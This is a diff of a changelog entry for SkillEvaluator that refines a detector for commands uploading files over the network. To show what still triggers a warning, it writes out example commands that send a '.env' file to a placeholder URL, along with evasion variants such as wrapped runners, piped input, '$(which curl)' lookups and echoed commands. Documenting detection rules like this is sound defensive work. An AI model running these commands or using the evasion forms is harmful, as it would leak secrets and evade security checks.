@@ -401,19 +401,32 @@ All notable changes to SkillEvaluator are documented in this file.
   comment or here-document prose. Every client named after another command is
   now checked with its own upload rules, as for a direct invocation, so
   `find . -exec curl -d @{} URL \;`, `poetry run curl -T .env URL`, and
-  `find . -name wget -exec curl -d @.env URL \;` still warn. Any client that a
-  runner such as `ssh`, `docker`, `kubectl`, `chroot`, `systemd-nspawn`,
-  `bwrap`, or `ip netns exec` starts in another host, container, root, user, or
-  network namespace warns as before, also behind a pass-through wrapper such
-  as `strace`, `ionice`, `flock`, or `watch`. Piped or redirected input stays
-  with a text consumer such as `grep`, `awk`, `sed`, or `jq`; any other
-  command may pass it on, so `cat .env | strace -f http URL` still warns.
-  Lookups such as `$(which curl)`, `$(which curl | head -1)`,
-  `$(command -v curl 2>/dev/null)`, `$(readlink -f $(which curl))`, and
-  `$(which ssh)`, and `$CURL` after a plain, `export`, or `declare`
-  assignment, resolve to the client or runner they name. A command printed by
-  `$(echo curl -d @.env URL)` or `$(printf ...)` keeps its printed arguments.
-  Both the host checker and the bundled Harbor verifier apply these rules.
+  `find . -name wget -exec curl -d @.env URL \;` still warn, while a plain
+  request through a command that is not a runner, such as `strace -f curl URL`
+  or `find . -exec curl URL \;`, is now scored like a direct `curl URL`. A
+  mention followed by an HTTP method, an upload flag, or a `key=value` word,
+  such as `http POST` in prose, still warns.
+  A fixed set of runners that start a command in another host, container,
+  root, user, or network namespace, such as `ssh`, `docker`, `docker-compose`,
+  `kubectl`, `apptainer`, `chroot`, `systemd-nspawn`, `bwrap`, or
+  `ip netns exec`, warns on any client named after it, even one named only as
+  data, as in `docker exec app apt-get install -y curl`. That holds when the
+  runner is the command itself or follows a pass-through wrapper such as
+  `strace`, `ionice`, `flock`, or `watch`. A runner reached through another
+  command, as in `find . -exec ssh host curl URL \;` or
+  `git submodule foreach ssh host curl URL`, and a runner outside the set are
+  checked only with the client's upload rules.
+  Piped or redirected input stays with a text consumer such as `grep`, `awk`,
+  `sed`, or `jq`; any other command, loop, `if`, or `{ ...; }` group may pass
+  it on, so `cat .env | strace -f http URL`, `< .env http URL`, and
+  `while read -r l; do http URL; done < .env` still warn. A substitution whose
+  first command names a client or runner, such as `$(which curl)`,
+  `$(env which curl)`, `$(command -v curl 2>/dev/null)`,
+  `$(readlink -f $(which curl))`, or `$(which ssh)`, and `$CURL` after a
+  plain, `export`, or `declare` assignment, resolve to that command. A command
+  printed by `$(echo curl -d @.env URL)` or `$(printf ...)` keeps its printed
+  arguments. Both the host checker and the bundled Harbor verifier apply these
+  rules.
 
 ### Security
 
